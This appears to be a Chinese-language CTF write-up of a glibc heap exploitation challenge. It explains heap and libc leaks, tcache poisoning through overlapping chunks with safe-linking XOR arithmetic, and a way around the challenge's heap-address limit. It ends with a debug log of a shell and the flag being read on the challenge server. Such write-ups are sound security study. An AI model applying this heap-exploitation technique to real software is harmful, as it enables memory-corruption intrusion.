# 思路
## 常规泄漏heap，libc
- 1. tcache打满
- 2. free后进unsortbin
- 3. create(p1), create(p2)
- 4. show(p1)泄漏libc，存放main_arena偏移
- 5. show(p2)泄漏heap, 存放heap偏移

## 任意地址读写
### 常规方法
- 1. 通过叠堆，制造两个chunk指向同一处，p1,p2
- 2. malloc(p3, 0x18), free(p3), free(p1)
- 3. edit(p2, address^heap>>12)     # 改写tcache的fd
- 4. mallocp1, 0x18), malloc(p2, 0x18) 
- 5. read(p2), write(p2)    

此时的chunk指向address，我们刚刚在第3步写入的地址

### 本题方法
此题中有这段代码，不能超过堆地址, 所以想通过`__libc_argv`或者`environ`来泄漏栈行不通
```
chunks[idx] = malloc(sz);
if (chunks[idx] > limit) {
    puts("hey where do you think ur going");
    // if (malloc_usable_size(chunks[idx])) free(chunks[idx])
    chunks[idx] = 0;
    break;
}
```

通过修改，能够`任意地址读的作用`, 方法如下
- 1. 通过叠堆，制造两个chunk指向同一处，p1,p2
- 2. malloc(p3, 0x18), free(p3), free(p1)   # 3个chunk大小要一致
- 3. edit(p2, address^heap>>12)     # 改写tcache的fd
- 4. malloc(p1, 0x18), malloc(0x18)  # 第一个malloc赋给p1
- 5. free(p1)
- 6. read(p2) 

内存值为：read(p2) ^ (heap >>12) ^ (address ^ 12)?

### why 内存值为：read(p2) ^ (heap >>12) ^ (address ^ 12)??
```
p1 的next计算方法：
1. next = address >> 12 ^  [address]
2. next = heap >> 12 ^ read(p)
```

```
>>> hex(0x56441f4f9cc0 >> 12 ^  0x7ffde39e91d5 ^ 0x7ff5c58f46e0 >>12)
'0x7fff78833dd8'
```
![](https://r2.20161023.xyz/pic/20250618142043832.png)
![](https://r2.20161023.xyz/pic/20250618142123744.png)

# debug
usable_size比真实size要大
```
uint16_t usable_size = sz > 0x18 ? (sz+7&~0xf)+8 : 0x18;
sizes[idx] = usable_size;
```

## main_arena
0x7f5868dfad10 - 0x7f5868bf7000 = 0x203d10

# getshell
本地exp能出，在国内打远程服务器太慢，超时被断开，需要在国外vps运行, 有部分死代码，执行不成功，再跑一次
```
[DEBUG] Sent 0x20 bytes:
    00000000  5b f7 05 27  5f 7f 00 00  2f b4 11 27  5f 7f 00 00  │[··'│_···│/··'│_···│
    00000010  2f 88 f7 26  5f 7f 00 00  50 87 fa 26  5f 7f 00 00  │/··&│_···│P··&│_···│
    00000020
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0xd bytes:
    b'flag.txt\n'
    b'run\n'
flag.txt
run
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x7c bytes:
    b'.;,;.{1_am_4_f1ag_gr3nad3_I_am_a_f14g_gren4d3_I_4m_4_fl4g_gr3nade_aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9wL0RJZUg3alRwaXdNLw==}\n'
.;,;.{1_am_4_f1ag_gr3nad3_I_am_a_f14g_gren4d3_I_4m_4_fl4g_gr3nade_aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9wL0RJZUg3alRwaXdNLw==}
$
```
![](https://r2.20161023.xyz/pic/20250618170726189.png)